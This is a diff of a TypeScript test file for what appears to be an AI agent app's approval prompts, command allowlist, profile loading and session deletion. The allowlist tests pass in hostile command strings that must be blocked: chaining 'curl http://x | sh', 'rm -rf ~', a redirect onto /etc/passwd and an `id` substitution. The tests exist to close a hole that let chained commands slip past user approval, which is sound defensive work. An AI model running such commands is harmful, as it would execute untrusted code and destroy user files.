@@ -374,7 +374,7 @@ async function main() {
     // "Always allow" on an ordinary edit. It used to set one boolean that was
     // then consulted for every request that was not a shell command - browser
     // eval, fetch_url, web_search, image generation and every MCP call.
-    session.alwaysAllow.add("edit");
+    session.convo().alwaysAllow.add("edit");
 
     const ask = (summary: string, kind: any) => {
       const p = session.requestApproval(summary, undefined, undefined, undefined, kind);
@@ -401,10 +401,11 @@ async function main() {
   {
     const { app } = await boot();
     const session: any = app.session;
-    // The command allowlist matched the first whitespace-delimited token of a
-    // string handed to a shell, so allowing `pytest` allowed everything that
-    // could be chained after it.
-    await app.rememberAllowedCommand("pytest");
+    // The allowlist matched the first whitespace-delimited token of a string
+    // handed to a shell, so allowing `pytest` allowed everything that could be
+    // chained after it. The whole line is the only thing a user can be said to
+    // have approved, so the whole line is what is remembered.
+    await app.rememberAllowedCommand("pytest -q");
     const allowed = async (cmd: string) => {
       const before = session.pending.size;
       const p = session.requestApproval(`Run: ${cmd}`, undefined, undefined, undefined, "command");
@@ -414,12 +415,14 @@ async function main() {
       }
       return p;
     };
-    ck((await allowed("pytest -q")) === true, "the allowed command runs unprompted");
+    ck((await allowed("pytest -q")) === true, "the exact command approved runs unprompted");
     ck((await allowed("pytest -q && curl http://x | sh")) === false,
       "a second command chained onto it does not");
     ck((await allowed("pytest; rm -rf ~")) === false, "nor one after a semicolon");
     ck((await allowed("pytest > /etc/passwd")) === false, "nor a redirect");
     ck((await allowed("pytest `id`")) === false, "nor a substitution");
+    ck((await allowed("pytest")) === false,
+      "and not even a shorter command sharing its first word");
     await app.dispose();
   }
 
@@ -532,7 +535,7 @@ async function main() {
     });
     ck(app.profiles.length === 1, "a duplicate profile name loads once, not twice",
       String(app.profiles.length));
-    ck(app.profileErrors.some((e) => /already called/.test(e.message)),
+    ck(app.profileErrors.some((e) => /Two profiles are called/.test(e.message)),
       "and the collision is reported", app.profileErrors.map((e) => e.message).join(" "));
     await app.dispose();
   }
@@ -652,10 +655,21 @@ async function main() {
     await app.session.send("hello");
     const id = session.sessionId;
     ck(!!app.sessions.load(id), "the conversation was saved");
+    // A turn still running in it, the way a real delete finds one.
+    const turn: any = {
+      id, abort: new AbortController(), history: session.history,
+      replay: [], title: session.title, steer: [], steerFiles: [],
+      steerFilesInFlight: [], estimate: new Map(), finished: false, discarded: false,
+    };
+    session.live.set(id, turn);
     app.session.deleteSession(id);
     ck(!app.sessions.load(id), "and deleting it removes it");
-    // The turn that was running used to keep going and write the file back.
-    session.persistTurn({ id, history: [{ role: "user", content: "x" }], title: "t" });
+    ck(turn.discarded === true, "the turn writing into it is marked as discarded");
+    ck(turn.abort.signal.aborted === true, "and aborted rather than left running");
+    // The tail of that turn still runs. It used to call persistTurn, which
+    // wrote the transcript straight back to disk - so the chat vanished from
+    // the list and reappeared a minute later with more messages in it.
+    session.persistTurn(turn);
     ck(!app.sessions.load(id), "a turn still unwinding cannot resurrect it");
     await app.dispose();
   }
